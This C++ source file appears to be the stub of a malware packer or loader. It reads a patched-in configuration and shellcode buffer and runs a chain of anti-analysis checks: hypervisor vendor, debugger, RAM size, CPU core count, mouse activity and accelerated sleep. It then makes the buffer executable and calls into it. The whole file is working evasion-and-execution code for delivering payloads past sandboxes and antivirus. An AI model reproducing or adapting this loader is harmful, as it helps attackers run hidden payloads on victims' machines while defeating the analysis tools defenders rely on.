#include <Windows.h>
#include "xorstr.hpp"
#include "Anti.h"


// Data that will be replaced by RibeyeSpecial, prepare 20bytes for now but will grow
const char rawData[2097252] = "COCONUTZ";

// Struct that will determine the configuration to run this
struct Coconut
{
	int AES_Key = 20;
	int sleepTime = 5000;
	bool sleep = false;
	bool antivm = false;
	bool prime = false;
	bool mouse = false;
	bool acceleratedsleep = false;
	bool debugger = false;
	bool ram = false;
	bool cpu_core = true;
	int szData = 0;
	char opcodes[2097152] = { 0 };
};


int main()
{

	if (cpuid_hypervisor_vendor())
	{
		return 1;
	}

	Coconut * settings = (Coconut*)rawData;

	if (settings->antivm)
	{
		if (cpuid_hypervisor_vendor())
		{
			return 1;
		}
	}
	if (settings->debugger)
	{
		if (chk_dbg())
			return 1;
	}
	if (settings->ram)
	{
		if (chk_ram())
			return 1;
	}
	if (settings->cpu_core)
	{
		if (chk_cores())
			return 1;
	}
	if (settings->mouse)
	{
		if (chk_mouse())
			return 1;
	}
	if (settings->prime) 
	{ 
		prime();
	}
	if (settings->acceleratedsleep)
	{
		if (chk_acceleratedsleep())
			return 1;
	}
	if (settings->sleep)
	{
		ntSleep(settings->sleepTime);
	}

	DWORD old;
	if (!ChangePageProtection((HANDLE)-1, (LPVOID)settings->opcodes, (PULONG)settings->szData, PAGE_EXECUTE, &old)) {

		int(*apt)() = (int(*)())(LPVOID)settings->opcodes;
		DWORD foo_value = apt();

	}
	else {
	}


	return 0;
}